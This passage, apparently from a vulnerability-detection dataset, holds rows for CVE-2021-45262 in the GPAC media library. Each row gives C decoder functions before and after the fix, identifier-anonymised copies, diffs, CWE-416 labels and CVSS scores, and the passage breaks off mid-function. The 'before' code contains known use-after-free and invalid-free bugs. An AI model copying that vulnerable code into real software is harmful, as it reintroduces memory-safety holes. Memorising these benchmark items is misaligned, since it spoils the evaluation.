		VAR_6 = gf_bifs_dec_node(VAR_0, VAR_1, VAR_3->NDTtype);
		if (VAR_6) {
			VAR_5 = gf_node_register(VAR_6, VAR_4 ? NULL : VAR_2);
			if (VAR_5) return VAR_5;
		}
		/* COMMENT_14 */
		*((GF_Node **) VAR_3->far_ptr) = VAR_6;
		break;
	case VAR_38:
#ifdef VAR_39
		VAR_0->LastError = VAR_2 ? SFScript_Parse(VAR_0, (SFScript*)VAR_3->far_ptr, VAR_1, VAR_2) : VAR_23;
#else
		return VAR_40;
#endif
		break;
	case VAR_41:
	{
		SFAttrRef *VAR_42 = (SFAttrRef *)VAR_3->far_ptr;
		u32 VAR_43 = 1 + gf_bs_read_int(VAR_1, VAR_0->info->config.NodeIDBits);
		VAR_42->node = gf_sg_find_node(VAR_0->current_graph, VAR_43);
		if (!VAR_42->node) {

		} else {
			u32 VAR_44 = gf_get_bit_size(gf_node_get_num_fields_in_mode(VAR_42->node, VAR_45) - 1);
			u32 VAR_46 = gf_bs_read_int(VAR_1, VAR_44);
			VAR_0->LastError = gf_bifs_get_field_index(VAR_42->node, VAR_46, VAR_45, &VAR_42->fieldIndex);
		}
	}
	break;
	default:
		return VAR_23;
	}
	return VAR_0->LastError;
}",gpac/d2f74e49f2cb8d687c0dc38f66b99e3c5c7d7fec/field_decode.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -164,6 +164,14 @@
 	}
 	break;
 	case GF_SG_VRML_SFNODE:
+		//if not memory dec mode, unregister previous node
+		//otherwise the field points to the memory command internal field
+		if (!is_mem_com) {
+			if ( *((GF_Node **) field->far_ptr) != NULL) {
+				gf_node_unregister(*((GF_Node **) field->far_ptr), node);
+				 *((GF_Node **) field->far_ptr) = NULL;
+			}
+		}
 		//for nodes the field ptr is a ptr to the field, which is a node ptr ;)
 		new_node = gf_bifs_dec_node(codec, bs, field->NDTtype);
 		if (new_node) {","{'deleted_lines': [], 'added_lines': ['\t\t//if not memory dec mode, unregister previous node', '\t\t//otherwise the field points to the memory command internal field', '\t\tif (!is_mem_com) {', '\t\t\tif ( *((GF_Node **) field->far_ptr) != NULL) {', '\t\t\t\tgf_node_unregister(*((GF_Node **) field->far_ptr), node);', '\t\t\t\t *((GF_Node **) field->far_ptr) = NULL;', '\t\t\t}', '\t\t}']}",True,GPAC v1.1.0 was discovered to contain an invalid call in the function gf_node_changed(). This vulnerability can lead to a Denial of Service (DoS).,5.5,MEDIUM,1,valid,2021-12-13T12:04:59Z,4
CVE-2021-45262,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1980,ef86a8eba3b166b885dec219066dd3a47501e03a,https://github.com/gpac/gpac/commit/ef86a8eba3b166b885dec219066dd3a47501e03a,src/scenegraph/vrml_tools.c,gf_sg_vrml_mf_reset,"GF_EXPORT
GF_Err gf_sg_vrml_mf_reset(void *mf, u32 FieldType)
{
GenMFField *mffield = (GenMFField *)mf;
if (!mffield || !mffield->array) return GF_OK;
if (gf_sg_vrml_is_sf_field(FieldType)) return GF_BAD_PARAM;
if (!gf_sg_vrml_get_sf_size(FieldType)) return GF_BAD_PARAM;
switch (FieldType) {
case GF_SG_VRML_MFSTRING:
gf_sg_mfstring_del( * ((MFString *) mf));
break;
case GF_SG_VRML_MFURL:
gf_sg_mfurl_del( * ((MFURL *) mf));
break;
case GF_SG_VRML_MFSCRIPT:
gf_sg_mfscript_del( * ((MFScript *) mf));
break;
default:
if (mffield->array) gf_free(mffield->array);
break;
}
mffield->array = NULL;
mffield->count = 0;
return GF_OK;
}","GF_EXPORT
VAR_0 gf_sg_vrml_mf_reset(void *VAR_1, u32 VAR_2)
{
GenMFField *VAR_3 = (GenMFField *)VAR_1;
if (!VAR_3 || !VAR_3->array) return VAR_4;
if (gf_sg_vrml_is_sf_field(VAR_2)) return VAR_5;
if (!gf_sg_vrml_get_sf_size(VAR_2)) return VAR_5;
switch (VAR_2) {
case VAR_6:
gf_sg_mfstring_del( * ((MFString *) VAR_1));
break;
case VAR_7:
gf_sg_mfurl_del( * ((MFURL *) VAR_1));
break;
case VAR_8:
gf_sg_mfscript_del( * ((MFScript *) VAR_1));
break;
default:
if (VAR_3->array) gf_free(VAR_3->array);
break;
}
VAR_3->array = NULL;
VAR_3->count = 0;
return VAR_4;
}",,"GF_EXPORT
GF_Err gf_sg_vrml_mf_reset(void *mf, u32 FieldType)
{
	GenMFField *mffield = (GenMFField *)mf;
	if (!mffield || !mffield->array) return GF_OK;

	//field we can't copy
	if (gf_sg_vrml_is_sf_field(FieldType)) return GF_BAD_PARAM;
	if (!gf_sg_vrml_get_sf_size(FieldType)) return GF_BAD_PARAM;

	switch (FieldType) {
	case GF_SG_VRML_MFSTRING:
		gf_sg_mfstring_del( * ((MFString *) mf));
		break;
	case GF_SG_VRML_MFURL:
		gf_sg_mfurl_del( * ((MFURL *) mf));
		break;
	case GF_SG_VRML_MFSCRIPT:
		gf_sg_mfscript_del( * ((MFScript *) mf));	
		break;
	default:
		if (mffield->array) gf_free(mffield->array);
		break;
	}

	mffield->array = NULL;
	mffield->count = 0;
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_sg_vrml_mf_reset(void *VAR_1, u32 VAR_2)
{
	GenMFField *VAR_3 = (GenMFField *)VAR_1;
	if (!VAR_3 || !VAR_3->array) return VAR_4;

	/* COMMENT_0 */
	if (gf_sg_vrml_is_sf_field(VAR_2)) return VAR_5;
	if (!gf_sg_vrml_get_sf_size(VAR_2)) return VAR_5;

	switch (VAR_2) {
	case VAR_6:
		gf_sg_mfstring_del( * ((MFString *) VAR_1));
		break;
	case VAR_7:
		gf_sg_mfurl_del( * ((MFURL *) VAR_1));
		break;
	case VAR_8:
		gf_sg_mfscript_del( * ((MFScript *) VAR_1));	
		break;
	default:
		if (VAR_3->array) gf_free(VAR_3->array);
		break;
	}

	VAR_3->array = NULL;
	VAR_3->count = 0;
	return VAR_4;
}",,"--- func_before
+++ func_after
@@ -16,7 +16,7 @@
 		gf_sg_mfurl_del( * ((MFURL *) mf));
 		break;
 	case GF_SG_VRML_MFSCRIPT:
-		gf_sg_mfscript_del( * ((MFScript *) mf));
+		gf_sg_mfscript_del( * ((MFScript *) mf));	
 		break;
 	default:
 		if (mffield->array) gf_free(mffield->array);","{'deleted_lines': ['\t\tgf_sg_mfscript_del( * ((MFScript *) mf));'], 'added_lines': ['\t\tgf_sg_mfscript_del( * ((MFScript *) mf));\t']}",True,"An invalid free vulnerability exists in gpac 1.1.0 via the gf_sg_command_del function, which causes a segmentation fault and application crash.",5.5,MEDIUM,1,valid,2021-12-13T13:21:50Z,4
CVE-2021-45262,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1980,ef86a8eba3b166b885dec219066dd3a47501e03a,https://github.com/gpac/gpac/commit/ef86a8eba3b166b885dec219066dd3a47501e03a,src/laser/lsr_dec.c,lsr_read_add_replace_insert,"static GF_Err lsr_read_add_replace_insert(GF_LASeRCodec *lsr, GF_List *com_list, u32 com_type)
{
GF_FieldInfo info;
GF_Node *n, *operandNode;
GF_Command *com;
GF_CommandField *field;
s32 idx, att_type, op_att_type;
u32 type, idref, op_idref = 0;
operandNode = NULL;
op_att_type = -1;
att_type = lsr_get_attribute_name(lsr);
idx = -1;
if (com_type) {
GF_LSR_READ_INT(lsr, type, 1, ""has_index"");
if (type) idx = lsr_read_vluimsbf5(lsr, ""index"");
}
if (com_type!=3) {
GF_LSR_READ_INT(lsr, type, 1, ""has_operandAttribute"");
if (type) GF_LSR_READ_INT(lsr, op_att_type, 8, ""attributeName"");
GF_LSR_READ_INT(lsr, type, 1, ""has_operandElementId"");
if (type) {
op_idref = lsr_read_codec_IDREF_command(lsr, ""operandElementId"");
operandNode = gf_sg_find_node(lsr->sg, op_idref);
if (!operandNode)
return GF_NON_COMPLIANT_BITSTREAM;
}
}
idref = lsr_read_codec_IDREF_command(lsr, ""ref"");
n = gf_sg_find_node(lsr->sg, idref);
if (!n) {
if (!com_list) {
return GF_NON_COMPLIANT_BITSTREAM;
}
}
GF_LSR_READ_INT(lsr, type, 1, ""has_value"");
if (type) {
if (att_type==-2) {
lsr_read_byte_align_string(lsr, NULL, ""anyXML"");
}
else if (att_type<0) {
GF_Node *new_node;
if (!com_type)
return GF_NON_COMPLIANT_BITSTREAM;
GF_LSR_READ_INT(lsr, type, 1, ""isInherit"");
if (type)
return GF_NON_COMPLIANT_BITSTREAM;
if (idx==-1) {
GF_LSR_READ_INT(lsr, type, 1, ""escapeFlag"");
if (type)
return GF_NON_COMPLIANT_BITSTREAM;
}
new_node = lsr_read_update_content_model(lsr, (idx==-1) ? NULL : (SVG_Element *)n);
if (com_list) {
com = gf_sg_command_new(lsr->sg, (com_type==3) ? GF_SG_LSR_INSERT : GF_SG_LSR_REPLACE);
gf_list_add(com_list, com);
if (n) {
com->node = n;
gf_node_register(com->node, NULL);
} else {
com->RouteID = idref;
gf_list_add(lsr->unresolved_commands, com);
}
field = gf_sg_command_field_new(com);
field->pos = idx;
field->new_node = new_node;
if (new_node) gf_node_register(new_node, NULL);
} else if (com_type==3) {
gf_node_list_insert_child(& ((SVG_Element *)n)->children, new_node, idx);
if (new_node) gf_node_register(new_node, n);
} else {
if (idx!=-1) {
GF_Node *old = gf_node_list_get_child( ((SVG_Element *)n)->children, idx);
if (old)
gf_node_replace(old, new_node, 0);
else {
gf_node_list_add_child( & ((SVG_Element *)n)->children, new_node);
if (new_node) gf_node_register(new_node, n);
}
} else {
gf_node_replace(n, new_node, 0);
}
}
}
else if (com_list) {
u32 field_type;
Bool text_content = 0;
com = gf_sg_command_new(lsr->sg, (com_type==0) ? GF_SG_LSR_ADD : (com_type==3) ? GF_SG_LSR_INSERT : GF_SG_LSR_REPLACE);
field = gf_sg_command_field_new(com);
field->pos = idx;
field_type = 0;
switch (att_type) {
case LSR_UPDATE_TYPE_TEXT_CONTENT:
text_content = 1;
break;
case LSR_UPDATE_TYPE_SCALE:
field->fieldType = field_type = SVG_Transform_Scale_datatype;
field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
break;
case LSR_UPDATE_TYPE_ROTATE:
field->fieldType = field_type = SVG_Transform_Rotate_datatype;
field->fieldIndex = TAG_SVG_ATT_transform;
break;
case LSR_UPDATE_TYPE_TRANSLATION:
field->fieldType = field_type = SVG_Transform_Translate_datatype;
field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
break;
case LSR_UPDATE_TYPE_SVG_HEIGHT:
field->fieldIndex = TAG_SVG_ATT_height;
field_type = field->fieldType = SVG_Length_datatype;
break;
case LSR_UPDATE_TYPE_SVG_WIDTH:
field->fieldIndex = TAG_SVG_ATT_width;
field_type = field->fieldType = SVG_Length_datatype;
break;
default:
field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
if (field->fieldIndex == (u32)-1) {
lsr->last_error = GF_NON_COMPLIANT_BITSTREAM;
gf_sg_command_del(com);
return lsr->last_error;
}
field_type = field->fieldType = gf_xml_get_attribute_type(field->fieldIndex);
break;
}
gf_list_add(com_list, com);
if (n) {
com->node = n;
gf_node_register(com->node, NULL);
} else {
com->RouteID = idref;
gf_list_add(lsr->unresolved_commands, com);
}
if (idx==-1) {
if (text_content) {
GF_DOMText *text = gf_dom_new_text_node(lsr->sg);
gf_node_register((GF_Node *)text, NULL);
lsr_read_byte_align_string(lsr, &text->textContent, ""val"");
field->new_node = (GF_Node*)text;
} else {
field->field_ptr = gf_svg_create_attribute_value(field_type);
lsr_read_update_value(lsr, NULL, field->fieldIndex, field->fieldType, field->field_ptr, n ? n->sgprivate->tag : 0);
}
} else {
field->field_ptr = lsr_read_update_value_indexed(lsr, (GF_Node*)n, field_type, NULL, idx, com_type==LSR_UPDATE_INSERT, 1, &field->fieldType);
}
} else {
GF_Point2D matrix_tmp;
SVG_Point_Angle matrix_tmp_rot;
u32 fieldIndex = 0;
u32 field_type = 0;
Bool text_content = 0;
Bool is_lsr_transform = 0;
switch (att_type) {
case LSR_UPDATE_TYPE_TEXT_CONTENT:
text_content = 1;
break;
case LSR_UPDATE_TYPE_SCALE:
info.far_ptr = (void *)&matrix_tmp;
field_type = SVG_Transform_Scale_datatype;
is_lsr_transform = 1;
break;
case LSR_UPDATE_TYPE_ROTATE:
info.far_ptr = (void *)&matrix_tmp_rot;
field_type = SVG_Transform_Rotate_datatype;
is_lsr_transform = 1;
break;
case LSR_UPDATE_TYPE_TRANSLATION:
info.far_ptr = (void *)&matrix_tmp;
field_type = SVG_Transform_Translate_datatype;
is_lsr_transform = 1;
break;
default:
fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
gf_node_get_attribute_by_tag(n, fieldIndex, 1, 0, &info);
field_type = info.fieldType;
break;
}
info.fieldType = field_type;
if (is_lsr_transform) {
SVG_Transform *dest;
if (idx==-1) {
lsr_read_update_value(lsr, NULL, fieldIndex, field_type, info.far_ptr, 0);
} else {
assert(0);
}
dest = (SVG_Transform *)info.far_ptr;
if (com_type) {
GF_Point2D scale, translate;
SVG_Point_Angle rotate;
if (gf_mx2d_decompose(&dest->mat, &scale, &rotate.angle, &translate)) {
gf_mx2d_init(dest->mat);
if (att_type==LSR_UPDATE_TYPE_SCALE) scale = matrix_tmp;
else if (att_type==LSR_UPDATE_TYPE_TRANSLATION) translate = matrix_tmp;
else if (att_type==LSR_UPDATE_TYPE_ROTATE) rotate = matrix_tmp_rot;
gf_mx2d_add_scale(&dest->mat, scale.x, scale.y);
gf_mx2d_add_rotation(&dest->mat, 0, 0, rotate.angle);
gf_mx2d_add_translation(&dest->mat, translate.x, translate.y);
}
}
else if (att_type==LSR_UPDATE_TYPE_SCALE) gf_mx2d_add_scale(&dest->mat, matrix_tmp.x, matrix_tmp.y);
else if (att_type==LSR_UPDATE_TYPE_TRANSLATION) gf_mx2d_add_translation(&dest->mat, matrix_tmp.x, matrix_tmp.y);
else if (att_type==LSR_UPDATE_TYPE_ROTATE) gf_mx2d_add_rotation(&dest->mat, 0, 0, matrix_tmp_rot.angle);
gf_node_changed((GF_Node*)n, &info);
}
else if (com_type) {
if (text_content) {
GF_DOMText *t = NULL;
if (idx>=0) {
if (com_type==LSR_UPDATE_INSERT) {
t = gf_dom_new_text_node(n->sgprivate->scenegraph);
gf_node_register((GF_Node *)t, n);
gf_node_list_insert_child(&((GF_ParentNode *)n)->children, (GF_Node*)t, idx);
} else {
t = (GF_DOMText *) gf_node_list_get_child(((SVG_Element*)n)->children, idx);
if (t->sgprivate->tag!=TAG_DOMText) t = NULL;
}
} else {
gf_sg_parent_reset(n);
t = gf_dom_add_text_node(n, NULL);
}
lsr_read_byte_align_string(lsr, t ? &t->textContent : NULL, ""textContent"");
gf_node_changed(n, NULL);
} else if (idx==-1) {
lsr_read_update_value(lsr, (GF_Node*)n, fieldIndex, field_type, info.far_ptr, n->sgprivate->tag);
} else {
Fixed *v1, *v2;
void *prev, *new_item;
void *tmp = lsr_read_update_value_indexed(lsr, (GF_Node*)n, field_type, info.far_ptr, idx, com_type==LSR_UPDATE_INSERT, 0, NULL);
switch (field_type) {
case SMIL_KeyTimes_datatype:
case SMIL_KeySplines_datatype:
case SVG_Points_datatype:
case SMIL_Times_datatype:
new_item = gf_list_pop_front(*(GF_List **)tmp);
if (com_type==LSR_UPDATE_INSERT) {
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, new_item, idx);
} else {
prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
gf_free(prev);
gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, new_item, idx);
}
gf_node_changed((GF_Node*)n, NULL);
gf_list_del(*(GF_List **)tmp);
gf_free(tmp);
break;
case SMIL_KeyPoints_datatype:
v1 = (Fixed *) gf_list_pop_front(*(GF_List **)tmp);
v2 = (Fixed *) gf_list_pop_front(*(GF_List **)tmp);
gf_list_del(*(GF_List **)tmp);
gf_free(tmp);
if (com_type==LSR_UPDATE_INSERT) {
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v1, idx);
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v2, idx+1);
} else {
prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
gf_free(prev);
gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
prev = gf_list_get(*(SVG_Coordinates*)info.far_ptr, idx);
gf_free(prev);
gf_list_rem(*(SVG_Coordinates*)info.far_ptr, idx);
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v1, idx);
gf_list_insert(*(SVG_Coordinates*)info.far_ptr, v2, idx);
}
gf_node_changed((GF_Node*)n, NULL);
break;
case SVG_ViewBox_datatype:
v1 = (Fixed*)tmp;
switch (idx) {
case 0:
((SVG_ViewBox*)info.far_ptr)->x = *v1;
break;
case 1:
((SVG_ViewBox*)info.far_ptr)->y = *v1;
break;
case 2:
((SVG_ViewBox*)info.far_ptr)->width = *v1;
break;
case 3:
((SVG_ViewBox*)info.far_ptr)->height = *v1;
break;
}
gf_free(tmp);
gf_node_changed((GF_Node*)n, NULL);
break;
case SVG_StrokeDashArray_datatype:
v1 = (Fixed*)tmp;
if (com_type==LSR_UPDATE_INSERT) {
SVG_StrokeDashArray*da = (SVG_StrokeDashArray*)info.far_ptr;
if (gf_sg_vrml_mf_insert(&da->array, GF_SG_VRML_MFFLOAT, (void*) &v2, idx)==GF_OK)
*v2 = *v1;
} else {
SVG_StrokeDashArray*da = (SVG_StrokeDashArray*)info.far_ptr;
if (idx<(s32)da->array.count) da->array.vals[idx] = *v1;
}
gf_free(tmp);
gf_node_changed((GF_Node*)n, NULL);
break;
default:
gf_free(tmp);
break;
}
}
} else {
GF_FieldInfo tmp;
tmp = info;
if (idx==-1) {
tmp.far_ptr = gf_svg_create_attribute_value(info.fieldType);
lsr_read_update_value(lsr, n, fieldIndex, field_type, tmp.far_ptr, n->sgprivate->tag);
} else {
tmp.far_ptr = lsr_read_update_value_indexed(lsr, n, field_type, NULL, idx, 0, 1, NULL);
}
gf_svg_attributes_add(&info, &tmp, &info, 0);
gf_svg_delete_attribute_value(info.fieldType, tmp.far_ptr, gf_node_get_graph(n));
}
}
}
else if (operandNode && (op_att_type>=0)) {
u32 opFieldIndex = gf_lsr_anim_type_to_attribute(op_att_type);
if (com_list) {
com = gf_sg_command_new(lsr->sg, com_type ? GF_SG_LSR_REPLACE : GF_SG_LSR_ADD);
gf_list_add(com_list, com);
com->node = n;
gf_node_register(com->node, NULL);
com->fromNodeID = op_idref;
com->fromFieldIndex = opFieldIndex;
field = gf_sg_command_field_new(com);
field->pos = idx;
field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
} else {
u32 fieldIndex;
GF_FieldInfo op_info;
fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
gf_node_get_field(n, fieldIndex, &info);
gf_node_get_field(operandNode, opFieldIndex, &op_info);
if (com_type) {
gf_svg_attributes_copy(&info, &op_info, 0);
} else {
gf_svg_attributes_add(&info, &op_info, &info, 0);
}
}
}
lsr_read_any_attribute(lsr, NULL, 1);
if (!com_type) return GF_OK;
GF_LSR_READ_INT(lsr, type, 1, ""opt_group"");
if (type) {
if (com_list) {
u32 count;
GF_ChildNodeItem *last = NULL;
if (com_type==LSR_UPDATE_INSERT) count = 1;
else count = lsr_read_vluimsbf5(lsr, ""count"");
com = gf_sg_command_new(lsr->sg, (com_type==LSR_UPDATE_REPLACE) ? GF_SG_LSR_REPLACE : GF_SG_LSR_INSERT);
gf_list_add(com_list, com);
com->node = n;
gf_node_register(com->node, NULL);
field = gf_sg_command_field_new(com);
field->pos = idx;
if (!count && (att_type==LSR_UPDATE_TYPE_TEXT_CONTENT)) {
field->fieldIndex = -1;
} else if (count==1) {
field->new_node = lsr_read_update_content_model(lsr, (SVG_Element *) n);
gf_node_register(field->new_node, NULL);
if (att_type>=0) field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
} else {
field->field_ptr = &field->node_list;
while (count) {
GF_Node *new_node = lsr_read_update_content_model(lsr, (SVG_Element *) n);
gf_node_register(new_node, NULL);
gf_node_list_add_child_last(& field->node_list, new_node, &last);
count--;
}
}
} else {
SVG_Element*elt = (SVG_Element*)n;
GF_ChildNodeItem *last = NULL;
u32 count;
if (com_type==LSR_UPDATE_INSERT) count = 1;
else count = lsr_read_vluimsbf5(lsr, ""count"");
if (com_type==LSR_UPDATE_REPLACE) {
if (idx>=0) {
GF_Node *new_node = gf_node_list_del_child_idx(&elt->children, idx);
if (new_node) gf_node_unregister(new_node, n);
} else {
gf_node_unregister_children(n, elt->children);
elt->children = NULL;
}
}
if ((com_type==LSR_UPDATE_INSERT) || (gf_lsr_anim_type_to_attribute(att_type) == TAG_LSR_ATT_children)) {
while (count) {
GF_Node *new_node = lsr_read_update_content_model(lsr, elt);
if (new_node) {
if (idx>=0) {
gf_node_list_insert_child(&elt->children, new_node, idx);
} else {
gf_node_list_add_child_last(&elt->children, new_node, &last);
}
gf_node_register(new_node, n);
}
count--;
}
gf_node_changed(n, NULL);
}
else if ((att_type==-1) && (count==1)) {
GF_Node *new_node = lsr_read_update_content_model(lsr, elt);
gf_node_replace((GF_Node*)elt, new_node, 0);
}
}
}
return GF_OK;
}","static GF_Err lsr_read_add_replace_insert(GF_LASeRCodec *VAR_0, GF_List *VAR_1, u32 VAR_2)
{
GF_FieldInfo VAR_3;
GF_Node *VAR_4, *VAR_5;
GF_Command *VAR_6;
GF_CommandField *VAR_7;
s32 VAR_8, VAR_9, VAR_10;
u32 VAR_11, VAR_12, VAR_13 = 0;
VAR_5 = NULL;
VAR_10 = -1;
VAR_9 = lsr_get_attribute_name(VAR_0);
VAR_8 = -1;
if (VAR_2) {
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_index"");
if (VAR_11) VAR_8 = lsr_read_vluimsbf5(VAR_0, ""index"");
}
if (VAR_2!=3) {
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_operandAttribute"");
if (VAR_11) GF_LSR_READ_INT(VAR_0, VAR_10, 8, ""attributeName"");
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_operandElementId"");
if (VAR_11) {
VAR_13 = lsr_read_codec_IDREF_command(VAR_0, ""operandElementId"");
VAR_5 = gf_sg_find_node(VAR_0->sg, VAR_13);
if (!VAR_5)
return VAR_14;
}
}
VAR_12 = lsr_read_codec_IDREF_command(VAR_0, ""ref"");
VAR_4 = gf_sg_find_node(VAR_0->sg, VAR_12);
if (!VAR_4) {
if (!VAR_1) {
return VAR_14;
}
}
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""has_value"");
if (VAR_11) {
if (VAR_9==-2) {
lsr_read_byte_align_string(VAR_0, NULL, ""anyXML"");
}
else if (VAR_9<0) {
GF_Node *VAR_15;
if (!VAR_2)
return VAR_14;
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""isInherit"");
if (VAR_11)
return VAR_14;
if (VAR_8==-1) {
GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""escapeFlag"");
if (VAR_11)
return VAR_14;
}
VAR_15 = lsr_read_update_content_model(VAR_0, (VAR_8==-1) ? NULL : (SVG_Element *)VAR_4);
if (VAR_1) {
VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==3) ? VAR_16 : VAR_17);
gf_list_add(VAR_1, VAR_6);
if (VAR_4) {
VAR_6->node = VAR_4;
gf_node_register(VAR_6->node, NULL);
} else {
VAR_6->RouteID = VAR_12;
gf_list_add(VAR_0->unresolved_commands, VAR_6);
}
VAR_7 = gf_sg_command_field_new(VAR_6);
VAR_7->pos = VAR_8;
VAR_7->new_node = VAR_15;
if (VAR_15) gf_node_register(VAR_15, NULL);
} else if (VAR_2==3) {
gf_node_list_insert_child(& ((SVG_Element *)VAR_4)->children, VAR_15, VAR_8);
if (VAR_15) gf_node_register(VAR_15, VAR_4);
} else {
if (VAR_8!=-1) {
GF_Node *VAR_18 = gf_node_list_get_child( ((SVG_Element *)VAR_4)->children, VAR_8);
if (VAR_18)
gf_node_replace(VAR_18, VAR_15, 0);
else {
gf_node_list_add_child( & ((SVG_Element *)VAR_4)->children, VAR_15);
if (VAR_15) gf_node_register(VAR_15, VAR_4);
}
} else {
gf_node_replace(VAR_4, VAR_15, 0);
}
}
}
else if (VAR_1) {
u32 VAR_19;
Bool VAR_20 = 0;
VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==0) ? VAR_21 : (VAR_2==3) ? VAR_16 : VAR_17);
VAR_7 = gf_sg_command_field_new(VAR_6);
VAR_7->pos = VAR_8;
VAR_19 = 0;
switch (VAR_9) {
case VAR_22:
VAR_20 = 1;
break;
case VAR_23:
VAR_7->fieldType = VAR_19 = VAR_24;
VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
break;
case VAR_25:
VAR_7->fieldType = VAR_19 = VAR_26;
VAR_7->fieldIndex = VAR_27;
break;
case VAR_28:
VAR_7->fieldType = VAR_19 = VAR_29;
VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
break;
case VAR_30:
VAR_7->fieldIndex = VAR_31;
VAR_19 = VAR_7->fieldType = VAR_32;
break;
case VAR_33:
VAR_7->fieldIndex = VAR_34;
VAR_19 = VAR_7->fieldType = VAR_32;
break;
default:
VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
if (VAR_7->fieldIndex == (u32)-1) {
VAR_0->last_error = VAR_14;
gf_sg_command_del(VAR_6);
return VAR_0->last_error;
}
VAR_19 = VAR_7->fieldType = gf_xml_get_attribute_type(VAR_7->fieldIndex);
break;
}
gf_list_add(VAR_1, VAR_6);
if (VAR_4) {
VAR_6->node = VAR_4;
gf_node_register(VAR_6->node, NULL);
} else {
VAR_6->RouteID = VAR_12;
gf_list_add(VAR_0->unresolved_commands, VAR_6);
}
if (VAR_8==-1) {
if (VAR_20) {
GF_DOMText *VAR_35 = gf_dom_new_text_node(VAR_0->sg);
gf_node_register((GF_Node *)VAR_35, NULL);
lsr_read_byte_align_string(VAR_0, &VAR_35->textContent, ""val"");
VAR_7->new_node = (GF_Node*)VAR_35;
} else {
VAR_7->field_ptr = gf_svg_create_attribute_value(VAR_19);
lsr_read_update_value(VAR_0, NULL, VAR_7->fieldIndex, VAR_7->fieldType, VAR_7->field_ptr, VAR_4 ? VAR_4->sgprivate->tag : 0);
}
} else {
VAR_7->field_ptr = lsr_read_update_value_indexed(VAR_0, (GF_Node*)VAR_4, VAR_19, NULL, VAR_8, VAR_2==VAR_36, 1, &VAR_7->fieldType);
}
} else {
GF_Point2D VAR_37;
SVG_Point_Angle VAR_38;
u32 VAR_39 = 0;
u32 VAR_19 = 0;
Bool VAR_20 = 0;
Bool VAR_40 = 0;
switch (VAR_9) {
case VAR_22:
VAR_20 = 1;
break;
case VAR_23:
VAR_3.far_ptr = (void *)&VAR_37;
VAR_19 = VAR_24;
VAR_40 = 1;
break;
case VAR_25:
VAR_3.far_ptr = (void *)&VAR_38;
VAR_19 = VAR_26;
VAR_40 = 1;
break;
case VAR_28:
VAR_3.far_ptr = (void *)&VAR_37;
VAR_19 = VAR_29;
VAR_40 = 1;
break;
default:
VAR_39 = gf_lsr_anim_type_to_attribute(VAR_9);
gf_node_get_attribute_by_tag(VAR_4, VAR_39, 1, 0, &VAR_3);
VAR_19 = VAR_3.fieldType;
break;
}
VAR_3.fieldType = VAR_19;
if (VAR_40) {
SVG_Transform *VAR_41;
if (VAR_8==-1) {
lsr_read_update_value(VAR_0, NULL, VAR_39, VAR_19, VAR_3.far_ptr, 0);
} else {
assert(0);
}
VAR_41 = (SVG_Transform *)VAR_3.far_ptr;
if (VAR_2) {
GF_Point2D VAR_42, VAR_43;
SVG_Point_Angle VAR_44;
if (gf_mx2d_decompose(&VAR_41->mat, &VAR_42, &VAR_44.angle, &VAR_43)) {
gf_mx2d_init(VAR_41->mat);
if (VAR_9==VAR_23) VAR_42 = VAR_37;
else if (VAR_9==VAR_28) VAR_43 = VAR_37;
else if (VAR_9==VAR_25) VAR_44 = VAR_38;
gf_mx2d_add_scale(&VAR_41->mat, VAR_42.x, VAR_42.y);
gf_mx2d_add_rotation(&VAR_41->mat, 0, 0, VAR_44.angle);
gf_mx2d_add_translation(&VAR_41->mat, VAR_43.x, VAR_43.y);
}
}
else if (VAR_9==VAR_23) gf_mx2d_add_scale(&VAR_41->mat, VAR_37.x, VAR_37.y);
else if (VAR_9==VAR_28) gf_mx2d_add_translation(&VAR_41->mat, VAR_37.x, VAR_37.y);
else if (VAR_9==VAR_25) gf_mx2d_add_rotation(&VAR_41->mat, 0, 0, VAR_38.angle);
gf_node_changed((GF_Node*)VAR_4, &VAR_3);
}
else if (VAR_2) {
if (VAR_20) {
GF_DOMText *VAR_45 = NULL;
if (VAR_8>=0) {
if (VAR_2==VAR_36) {
VAR_45 = gf_dom_new_text_node(VAR_4->sgprivate->scenegraph);
gf_node_register((GF_Node *)VAR_45, VAR_4);
gf_node_list_insert_child(&((GF_ParentNode *)VAR_4)->children, (GF_Node*)VAR_45, VAR_8);
} else {
VAR_45 = (GF_DOMText *) gf_node_list_get_child(((SVG_Element*)VAR_4)->children, VAR_8);
if (VAR_45->sgprivate->tag!=VAR_46) VAR_45 = NULL;
}
} else {
gf_sg_parent_reset(VAR_4);
VAR_45 = gf_dom_add_text_node(VAR_4, NULL);
}
lsr_read_byte_align_string(VAR_0, VAR_45 ? &VAR_45->textContent : NULL, ""textContent"");
gf_node_changed(VAR_4, NULL);
} else if (VAR_8==-1) {
lsr_read_update_value(VAR_0, (GF_Node*)VAR_4, VAR_39, VAR_19, VAR_3.far_ptr, VAR_4->sgprivate->tag);
} else {
Fixed *VAR_47, *VAR_48;
